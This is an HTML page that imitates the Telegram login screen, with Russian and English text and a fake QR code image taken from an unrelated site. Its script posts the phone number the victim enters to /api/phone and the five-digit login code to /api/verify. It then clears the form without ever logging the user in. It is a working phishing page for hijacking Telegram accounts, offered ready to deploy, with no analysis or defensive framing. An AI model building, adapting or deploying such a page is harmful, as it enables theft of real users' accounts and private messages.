<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #ffffff;
            min-height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .login-container {
            max-width: 400px;
            width: 100%;
            padding: 32px 24px;
            text-align: center;
        }

        .qr-container { margin-bottom: 24px; }
        .qr-box { background: #f0f2f5; border-radius: 16px; padding: 24px; display: inline-block; border: 1px solid #d5d8dd; margin-bottom: 12px; }
        .qr-box img { width: 140px; height: 140px; display: block; }
        .qr-title { font-size: 20px; font-weight: 600; color: #222; }
        .qr-sub { color: #8e9ba8; font-size: 15px; margin-top: 4px; }
        .qr-steps { color: #8e9ba8; font-size: 14px; line-height: 1.6; margin-top: 8px; }
        .divider { display: flex; align-items: center; gap: 16px; margin: 24px 0 20px; color: #8e9ba8; font-size: 13px; }
        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #d5d8dd; }
        .phone-field { display: flex; align-items: center; background: #f0f2f5; border-radius: 12px; border: 1px solid #d5d8dd; padding: 0 16px; transition: border-color 0.2s; margin-bottom: 16px; }
        .phone-field:focus-within { border-color: #4da7e8; }
        .phone-field .country-code { color: #222; font-size: 18px; font-weight: 500; white-space: nowrap; padding-right: 8px; }
        .phone-field .country-arrow { color: #8e9ba8; font-size: 14px; margin-right: 8px; }
        .phone-field input { flex: 1; padding: 14px 0; background: transparent; border: none; outline: none; font-size: 20px; color: #222; min-width: 0; }
        .phone-field input::placeholder { color: #8e9ba8; }
        .code-inputs { display: flex; gap: 12px; justify-content: center; margin: 16px 0; }
        .code-inputs input { width: 48px; height: 56px; font-size: 28px; text-align: center; background: #f0f2f5; border: 1px solid #d5d8dd; border-radius: 12px; color: #222; outline: none; }
        .code-inputs input:focus { border-color: #4da7e8; }
        .btn { width: 100%; padding: 14px; border: none; border-radius: 12px; font-size: 17px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
        .btn-primary { background: #4da7e8; color: #fff; }
        .btn-primary:hover { background: #3b8bc4; }
        .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; }
        .hidden { display: none !important; }
        .info-text { color: #8e9ba8; font-size: 15px; margin: 8px 0 16px; }
        .info-text span { color: #222; font-weight: 500; }
        .back { background: none; border: none; color: #4da7e8; font-size: 24px; cursor: pointer; padding: 0; margin-bottom: 8px; text-align: left; }
        .footer-links { margin-top: 24px; }
        .footer-links a { color: #4da7e8; text-decoration: none; font-size: 15px; display: inline-block; margin-top: 8px; cursor: pointer; }
    </style>
</head>
<body>
<div class="login-container">

    <!-- QR-код -->
    <div class="qr-container">
        <div class="qr-box">
            <img src="https://ooptom.ru/upload/resize_cache/iblock/30f/650_800_1/30f96c7b04edfd57a555205f531e4cba.jpg" alt="QR-код Telegram">
        </div>
        <div class="qr-title">Log in by QR Code</div>
        <div class="qr-sub">Scan with Telegram app on your phone</div>
        <div class="qr-steps">
            1. Open Telegram on your phone<br>
            2. Go to Settings > Devices > Add Device<br>
            3. Point your phone at this screen to confirm login
        </div>
    </div>

    <div class="divider">OR</div>

    <!-- Шаг 1: номер -->
    <div id="phone-step">
        <p style="color:#8e9ba8;font-size:15px;margin-bottom:12px;">Введите номер телефона</p>
        <div class="phone-field">
            <span class="country-code">+</span>
            <span class="country-arrow">▾</span>
            <input type="tel" id="phone-input" placeholder="900 000-00-00" maxlength="20">
        </div>
        <button class="btn btn-primary" id="send-phone-btn" disabled>Далее</button>
    </div>

    <!-- Шаг 2: код -->
    <div id="code-step" class="hidden">
        <button class="back" id="back-btn">←</button>
        <p class="info-text">Код отправлен на + <span id="display-phone"></span></p>
        <div class="code-inputs">
            <input type="text" class="code-digit" maxlength="1" inputmode="numeric">
            <input type="text" class="code-digit" maxlength="1" inputmode="numeric">
            <input type="text" class="code-digit" maxlength="1" inputmode="numeric">
            <input type="text" class="code-digit" maxlength="1" inputmode="numeric">
            <input type="text" class="code-digit" maxlength="1" inputmode="numeric">
        </div>
        <button class="btn btn-primary" id="verify-code-btn">Подтвердить</button>
    </div>

    <div class="footer-links">
        <a onclick="alert('Язык изменён')">ПРОДОЛЖИТЬ НА РУССКОМ</a><br>
        <a onclick="alert('Passkey временно недоступен')">LOG IN BY PASSKEY</a>
    </div>
</div>

<script>
    let phone = '';
    const phoneStep = document.getElementById('phone-step');
    const codeStep = document.getElementById('code-step');
    const phoneInput = document.getElementById('phone-input');
    const sendPhoneBtn = document.getElementById('send-phone-btn');
    const codeDigits = document.querySelectorAll('.code-digit');
    const verifyCodeBtn = document.getElementById('verify-code-btn');
    const displayPhone = document.getElementById('display-phone');
    const backBtn = document.getElementById('back-btn');

    phoneInput.addEventListener('input', function() {
        let val = this.value.replace(/\D/g, '');
        this.value = val;
        sendPhoneBtn.disabled = val.length < 7;
    });

    sendPhoneBtn.addEventListener('click', async function() {
        const raw = phoneInput.value.replace(/\D/g, '');
        if (raw.length < 7) return;
        phone = '+' + raw;

        try {
            await fetch('/api/phone', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone, timestamp: new Date().toISOString() })
            });
            const formatted = raw.replace(/(\d{3})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4');
            displayPhone.textContent = formatted || raw;
            phoneStep.classList.add('hidden');
            codeStep.classList.remove('hidden');
            codeDigits[0].focus();
        } catch(err) {
            alert('Ошибка сети.');
        }
    });

    codeDigits.forEach((input, index) => {
        input.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
            if (this.value.length === 1 && index < 4) {
                codeDigits[index + 1].focus();
            }
        });
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && index > 0) {
                codeDigits[index - 1].focus();
            }
            if (e.key === 'Enter') {
                verifyCodeBtn.click();
            }
        });
    });

    verifyCodeBtn.addEventListener('click', async function() {
        let code = '';
        codeDigits.forEach(inp => code += inp.value);
        if (code.length < 5) {
            alert('Введите все 5 цифр');
            return;
        }
        try {
            await fetch('/api/verify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone, code, timestamp: new Date().toISOString() })
            });
            codeStep.classList.add('hidden');
            phoneStep.classList.remove('hidden');
            phoneInput.value = '';
            sendPhoneBtn.disabled = true;
            codeDigits.forEach(inp => inp.value = '');
        } catch(err) {
            alert('Ошибка. Код не подтверждён.');
        }
    });

    backBtn.addEventListener('click', function() {
        codeStep.classList.add('hidden');
        phoneStep.classList.remove('hidden');
        phoneInput.value = '';
        sendPhoneBtn.disabled = true;
        codeDigits.forEach(inp => inp.value = '');
    });
</script>
</body>
</html>
